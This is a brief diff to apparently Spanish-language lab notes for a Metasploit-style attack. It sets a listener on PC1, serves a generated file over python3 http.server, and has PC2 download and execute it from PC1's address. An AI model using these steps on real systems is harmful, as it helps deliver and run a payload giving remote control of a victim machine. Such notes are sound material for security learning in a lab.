@@ -9,3 +9,7 @@
 ++ PC1 set lhost <ip_PC1>
 ++ PC1 set lport 445
 ++ PC1 run
+++ PC1 python3 -m http.server (Servidor para compartir el archivo generado) 
+++ PC2 http://<ip_PC1>:8000
+++ PC2 Descargar y ejecutar el archivo 
+
